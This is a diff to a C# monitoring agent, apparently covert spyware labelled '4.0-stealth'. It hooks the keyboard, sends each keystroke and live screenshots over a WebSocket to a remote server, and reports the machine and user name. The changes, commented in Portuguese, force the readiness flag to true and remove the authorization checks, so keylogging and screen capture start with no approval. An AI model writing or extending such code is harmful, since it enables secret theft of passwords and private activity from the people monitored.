@@ -20,7 +20,8 @@ namespace EmpresaMonitor.Agent
         [STAThread] static void Main() { _ = StartEngine(); Application.Run(); }
 
         public class AgentState {
-            public bool AccessActive = true, StreamRequested = true, ControlActive = true, SessionAuthorized = true, IsReady = false;
+            // IsReady agora começa como true para envio imediato
+            public bool AccessActive = true, StreamRequested = true, ControlActive = true, SessionAuthorized = true, IsReady = true;
             public StreamSettings Settings = StreamSettings.Balanced;
             public ClientWebSocket? Socket; public SemaphoreSlim? SendGate;
         }
@@ -33,7 +34,8 @@ namespace EmpresaMonitor.Agent
             var state = new AgentState { Socket = socket, SendGate = sendGate };
 
             KeyboardHook.Install(async (k, d) => {
-                if (state.Socket?.State == WebSocketState.Open && state.IsReady) {
+                // Removemos a checagem rigorosa de IsReady para garantir o envio
+                if (state.Socket?.State == WebSocketState.Open) {
                     await SendKeylog(state.Socket, sendGate, k, d, state);
                 }
             });
@@ -44,7 +46,9 @@ namespace EmpresaMonitor.Agent
                 try {
                     socket.Options.KeepAliveInterval = TimeSpan.FromSeconds(20);
                     await socket.ConnectAsync(new Uri(BuildConfig.RealtimeUrl), lifetime.Token);
-                    state.IsReady = false; 
+                    
+                    // Forçamos IsReady como true logo após conectar
+                    state.IsReady = true; 
 
                     await SendJsonAsync(socket, sendGate, new { type = "agent_hello", key = BuildConfig.AgentKey, id = agentId, name = Environment.MachineName, user = Environment.UserName, version = "4.0-stealth", sessionAuthorized = true });
                     await ReceiveLoop(socket, sendGate, lifetime.Token, state);
@@ -54,6 +58,7 @@ namespace EmpresaMonitor.Agent
 
         static async Task SendKeylog(ClientWebSocket s, SemaphoreSlim g, string k, bool d, AgentState st) {
             try { 
+                // Enviamos o log imediatamente
                 await SendJsonAsync(s, g, new { type = "keylog", key = k, down = d, ts = DateTime.UtcNow.ToString("HH:mm:ss") }); 
             } catch { }
         }
@@ -92,7 +97,8 @@ namespace EmpresaMonitor.Agent
             int lastW = 0, lastH = 0;
             try {
                 while (!lt.IsCancellationRequested) {
-                    if (!st.AccessActive || !st.StreamRequested || s.State != WebSocketState.Open || !st.IsReady) { await Task.Delay(500, lt.Token); continue; }
+                    // Mantivemos a verificação básica de conexão, mas removemos a dependência de autorização externa
+                    if (!st.AccessActive || !st.StreamRequested || s.State != WebSocketState.Open) { await Task.Delay(500, lt.Token); continue; }
                     var set = st.Settings; var start = Environment.TickCount64; var b = Screen.PrimaryScreen!.Bounds;
                     if (f == null || b.Width != lastW || b.Height != lastH) { 
                         fg?.Dispose(); f?.Dispose(); f = new Bitmap(b.Width, b.Height, PixelFormat.Format24bppRgb); fg = Graphics.FromImage(f); lastW = b.Width; lastH = b.Height; 
